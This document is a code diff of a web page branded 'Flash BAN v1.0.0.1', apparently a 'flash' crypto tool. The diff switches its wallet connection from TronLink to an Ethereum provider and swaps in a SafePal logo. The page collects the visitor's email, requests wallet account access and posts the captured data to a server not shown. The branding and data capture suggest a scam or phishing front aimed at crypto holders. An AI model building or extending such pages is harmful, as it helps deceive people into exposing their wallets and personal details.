@@ -4,7 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Flash BAN 11.0 Connection to DEFI Network</title>
-    <script src="https://cdn.jsdelivr.net/npm/tronlink-web3"></script>
+    <script src="https://cdn.jsdelivr.net/npm/web3/dist/web3.min.js"></script>
     <style>
         body {
             font-family: 'Arial', sans-serif;
@@ -26,7 +26,7 @@
             border: 2px solid rgb(255, 0, 19);
             position: relative;
         }
-        .tron-logo {
+        .wallet-logo {
             width: 80px;
             margin-bottom: 10px;
         }
@@ -72,7 +72,7 @@
 </head>
 <body>
     <div class="container">
-        <img src="https://cryptologos.cc/logos/tron-trx-logo.png" alt="Tron Logo" class="tron-logo">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e4/SafePal_Logo.svg/512px-SafePal_Logo.svg.png" alt="SafePal Logo" class="wallet-logo">
         <h1>Flash BAN v1.0.0.1</h1>
         <input type="email" id="emailInput" placeholder="Enter your email" required>
         <button id="connectButton">CONNECT</button>
@@ -81,7 +81,6 @@
     </div>
 
     <script>
-        let provider;
         let connectedAddress = null;
         let isConnecting = false;
 
@@ -91,10 +90,11 @@
             document.getElementById('connectButton').textContent = 'Connecting...';
             document.getElementById('connectButton').style.backgroundColor = 'rgb(255, 165, 0)';
 
-            if (typeof window.tronLink !== 'undefined') {
+            if (window.ethereum) {
                 try {
-                    provider = window.tronLink.tronWeb;
-                    const accounts = await provider.request({ method: 'tron_requestAccounts' });
+                    const web3 = new Web3(window.ethereum);
+                    await window.ethereum.request({ method: 'eth_requestAccounts' });
+                    const accounts = await web3.eth.getAccounts();
                     connectedAddress = accounts[0];
 
                     document.getElementById('connectButton').textContent = 'Wallet Connected';
@@ -112,13 +112,14 @@
                         },
                         body: jsonData
                     });
+
                 } catch (error) {
-                    document.getElementById('statusMessage').textContent = "TronLink connection failed.";
-                    document.getElementById('connectButton').textContent = 'Connect to TronLink';
+                    document.getElementById('statusMessage').textContent = "Wallet connection failed.";
+                    document.getElementById('connectButton').textContent = 'Connect Wallet';
                     document.getElementById('connectButton').style.backgroundColor = 'rgb(255, 0, 19)';
                 }
             } else {
-                document.getElementById('statusMessage').textContent = "TronLink is not installed!";
+                document.getElementById('statusMessage').textContent = "SafePal Wallet or MetaMask is not installed!";
             }
 
             isConnecting = false;
